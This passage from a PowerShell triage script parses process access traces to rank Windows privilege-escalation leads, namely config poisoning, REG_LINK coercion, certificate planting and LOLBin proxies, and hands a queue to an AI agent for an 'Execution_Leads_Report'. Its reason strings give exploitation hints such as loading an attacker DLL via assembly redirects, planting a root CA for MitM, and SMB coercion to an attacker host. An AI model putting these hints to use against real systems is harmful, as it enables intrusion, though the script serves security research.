        foreach ($fh in $frameworkHosts) {
            if ($procs -match "(?i)\b$([regex]::Escape($fh))\b") { $isFrameworkHost = $true; break }
        }

        $isExploitableConfig = $false
        foreach ($pattern in $exploitableConfigPatterns) {
            if ($path -match $pattern) { $isExploitableConfig = $true; break }
        }

        if ($isExploitableConfig -or $isFrameworkHost) {
            $severity = "High"
            $type = "Config Poisoning / Assembly Redirect"
            $exploitPrimitive = "Config_Poison"
            $reason = "Writable configuration file consumed by a framework host process."

            if ($path -match "(?i)(machine\.config|web\.config|app\.config|applicationHost\.config)") {
                $severity = "Critical"
                $reason += " .NET config file → inject '<assemblyBinding>' redirect to load attacker DLL, or add '<machineKey>' for ViewState deserialization. No privileges needed."
            } elseif ($path -match "(?i)\.xml$" -and $isFrameworkHost) {
                $reason += " XML consumed by $procs → test for XXE (XML External Entity) to read local files or trigger SMB auth to \\\\attacker."
            } elseif ($path -match "(?i)\.json$" -and $isFrameworkHost) {
                $reason += " JSON consumed by $procs → if rehydrated into a UI/WebView (Adaptive Cards, React state), test for XSS via untrusted-fields-into-innerHTML; if used to seed 'JsonConvert.DeserializeObject<object>', test for type-confusion / 'TypeNameHandling=All' deserialization sinks."
            }
            $isDirectLead = $true
        }
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 10: Registry Path Coercion via REG_LINK
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and $isPrivileged -and ($path -match "^HKCU" -or $path -match "^HKEY_CURRENT_USER" -or $path -match "^HKU\\" -or $path -match "^HKEY_USERS\\")) {
        if (-not $openLink) {
            $severity = "Critical"
            $type = "Registry Path Coercion Candidate"
            $exploitPrimitive = "Registry_Coercion"
            $reason = "PRIVILEGED PROCESS ($integrity) accesses a user-writable registry key without REG_OPTION_OPEN_LINK. Plant a REG_LINK redirecting elsewhere in the user's hive. NO SPECIAL PRIVILEGES REQUIRED. Effective principal: $effectivePrincipal."
            if ($anyImpersonating) {
                $reason += " Impersonation context observed → consumer is reading USER's hive while running as user — classic CVE-2014-6322 archetype."
            }
            $isDirectLead = $true
        }
    }

    # ─────────────────────────────────────────────────────────────────────────
    # RULE 9: Certificate / Crypto Store Planting
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead -and ($path -match "\.(cer|crt|pfx|p12|pem|key|p7b)$" -or
        $path -match "(?i)(Crypto\\Keys|Certificate|PKI|AuthRoot|ROOT\\Certificates|SystemCertificates\\Root)")) {
        $severity = "High"
        $type = "Certificate / Crypto Store Planting"
        $exploitPrimitive = "Cert_Plant"
        $reason = "Writable certificate or crypto store path. Plant trusted root CA to enable MitM, or inject code-signing cert to bypass signature checks. No privileges needed to write."
        if ($isPrivileged) {
            $severity = "Critical"
            $reason += " CONSUMED BY PRIVILEGED PROCESS ($integrity) → system-wide trust manipulation."
        }
        $isDirectLead = $true
    }

    # ─────────────────────────────────────────────────────────────────────────
    # LOLBin cross-reference (extension-aware)
    # ─────────────────────────────────────────────────────────────────────────
    $extension = if ($path -match '\.[A-Za-z0-9]{1,6}$') { $matches[0].ToLowerInvariant() } else { "" }
    foreach ($bin in $lolBinExtensions.Keys) {
        if ($procs -match "(?i)\b$([regex]::Escape($bin))\b") {
            $supportedExts = $lolBinExtensions[$bin]
            $extensionMatches = ($supportedExts.Count -eq 0) -or ($supportedExts -contains $extension)
            if (-not $extensionMatches) { continue }

            if ($severity -eq "Low") { $severity = "Medium" }
            elseif ($severity -eq "Medium") { $severity = "High" }

            if ($isDirectLead) {
                $reason += " -> INTERACTED WITH LOLBIN: $bin (severity escalated, extension '$extension' is consumable by $bin)"
            } else {
                $type = "LOLBin Proxy Target"
                $exploitPrimitive = "LOLBin_Proxy"
                $reason = "File ($extension) queried by $bin — a known proxy-execution LOLBin for this extension. Re-confirm parsing path before claiming RCE; some LOLBins parse only specific embedded constructs (e.g. msbuild needs an embedded '<Target>' element with a '<Tasks.Code>' task)."
                $isDirectLead = $true
            }
            break
        }
    }

    # ─────────────────────────────────────────────────────────────────────────
    # COGNITIVE QUEUE — items that need agent semantic analysis
    # ─────────────────────────────────────────────────────────────────────────
    if (-not $isDirectLead) {
        if ($path -match "\.(config|xml|ini|json|yml|yaml|txt|log|db|dat|reg|inf|pol|asar|md|csv)$" -or $path -match "^HK") {
            $hint = "Requires semantic analysis. "
            if ($isPrivilegedAny) {
                $hint += "HIGH-VALUE: a privileged actor was observed on this path. Effective principal: $effectivePrincipal. "
                $hint += "Check for: (1) Assembly binding redirects in .NET configs, (2) XXE/XInclude in XML files, (3) Deserialization sinks ('TypeNameHandling=All', BinaryFormatter, YAML.Load), (4) SMB coercion via config values pointing to UNC paths, (5) Credential / token material in plaintext, (6) For registry paths: REG_LINK TOCTOU or missing REG_OPTION_OPEN_LINK, (7) For JSON consumed by a WebView2/Electron renderer: DOM-XSS via untrusted-string-into-innerHTML."
            } else {
                $hint += "Standard-priv context. Check for: deserialization sinks, config-driven code loading, credential harvesting, sensitive token leakage."
            }
            if ($anyWrite -and $anyRead) {
                $hint += " NOTE: BOTH read and write observed → race-window candidate."
            } elseif ($opDirection -eq "Write") {
                $hint += " NOTE: Process WRITES this file → if you can race/redirect, this is an arbitrary-write primitive."
            }

            $cognitiveQueue.Add([PSCustomObject]@{
                Path = $path
                Processes = $procs
                Operations = $operations
                Hint = $hint
                TraceFile = (Get-FieldValue $entry "TraceFile")
                Timestamp = (Get-FieldValue $entry "Timestamp")
                Operation = $operation
                Result = $result
                Detail = $detail
                Integrity = $integrity
                Impersonating = $impersonating
                OperationDirection = $opDirection
                SqosLevel = $sqos
                EffectivePrincipal = $effectivePrincipal
                AnyPrivRead  = $anyPrivRead
                AnyPrivWrite = $anyPrivWrite
                OpenReparsePoint = $openRP
                OpenLink = $openLink
            })
        } elseif ($path -match "(System32|Program Files|Windows\\)" -and $isPrivilegedAny) {
            $cognitiveQueue.Add([PSCustomObject]@{
                Path = $path
                Processes = $procs
                Operations = $operations
                Hint = "Highly privileged base directory. Check if the accessed path maps to an environmental override, proxy execution, or symlink redirect opportunity. Direction: $opDirection. Effective principal: $effectivePrincipal."
                TraceFile = (Get-FieldValue $entry "TraceFile")
                Timestamp = (Get-FieldValue $entry "Timestamp")
                Operation = $operation
                Result = $result
                Detail = $detail
                Integrity = $integrity
                Impersonating = $impersonating
                OperationDirection = $opDirection
                SqosLevel = $sqos
                EffectivePrincipal = $effectivePrincipal
                AnyPrivRead  = $anyPrivRead
                AnyPrivWrite = $anyPrivWrite
                OpenReparsePoint = $openRP
                OpenLink = $openLink
            })
        }
    } else {
        # Severity boost when same path has BOTH privileged Read and Write
        # (race-window candidate per LPE §3.7 oplock chain).
        if ($anyPrivRead -and $anyPrivWrite -and $severity -ne "Critical") {
            $severity = "Critical"
            $reason += " [Race window — privileged READ and WRITE on same path]"
        }

        $hardcodedLeads.Add([PSCustomObject]@{
            Severity = $severity
            Type = $type
            ExploitPrimitive = $exploitPrimitive
            Path = $path
            Processes = $procs
            Operations = $operations
            DetailedReason = $reason
            EffectivePrincipal = $effectivePrincipal
            TraceFile = (Get-FieldValue $entry "TraceFile")
            Timestamp = (Get-FieldValue $entry "Timestamp")
            Operation = $operation
            OperationDirection = $opDirection
            Result = $result
            Detail = $detail
            Integrity = $integrity
            Impersonating = $impersonating
            SqosLevel = $sqos
            OpenReparsePoint = $openRP
            OpenLink = $openLink
            AnyPrivRead  = $anyPrivRead
            AnyPrivWrite = $anyPrivWrite
            AnyImpersonating = $anyImpersonating
        })
    }
}

# ═══════════════════════════════════════════════════════════════════════════════
# OUTPUT
# ═══════════════════════════════════════════════════════════════════════════════

$hardcodedJsonPath = Join-Path $feedDir "high_confidence_leads.json"
$cognitiveJsonPath = Join-Path $feedDir "cognitive_review_queue.json"

$severityOrder = @{ "Critical" = 1; "High" = 2; "Medium" = 3; "Low" = 4; "Unknown" = 5 }
$sortedLeads = $hardcodedLeads | Sort-Object { $severityOrder[$_.Severity] }

$sortedLeads | ConvertTo-Json -Depth 4 | Out-File $hardcodedJsonPath -Encoding UTF8
$cognitiveQueue | ConvertTo-Json -Depth 4 | Out-File $cognitiveJsonPath -Encoding UTF8

$primitiveStats = $hardcodedLeads | Group-Object ExploitPrimitive | Sort-Object Count -Descending
Write-Host ""
Write-Host "[+] Heuristic Analysis Complete." -ForegroundColor Green
Write-Host "    -> High Confidence Leads: $($hardcodedLeads.Count)" -ForegroundColor Green
Write-Host "    -> Pushed to Cognitive Queue: $($cognitiveQueue.Count)" -ForegroundColor Yellow
Write-Host ""
Write-Host "    False-Positive Filters Applied:" -ForegroundColor Cyan
Write-Host "       Paging-I/O / kernel attribution dropped: $dropPagingIO" -ForegroundColor Gray
Write-Host "       Open Reparse Point always-set demoted:    $dropOpenReparse" -ForegroundColor Gray
Write-Host "       REG_OPTION_OPEN_LINK always-set demoted:  $dropOpenLink"   -ForegroundColor Gray
Write-Host "       User-only-consumer (`§9` FP) dropped:    $dropUserOnly"   -ForegroundColor Gray
Write-Host "       Benign-readers-only demoted:              $dropBenignReaderOnly" -ForegroundColor Gray
Write-Host ""
Write-Host "    Exploit Primitive Breakdown:" -ForegroundColor Cyan
foreach ($stat in $primitiveStats) {
    Write-Host "       $($stat.Name): $($stat.Count)" -ForegroundColor White
}
Write-Host ""
Write-Host "[!] INSTRUCTION: Agent should now ingest '$cognitiveJsonPath' and formulate the final Execution_Leads_Report.md." -ForegroundColor Magenta
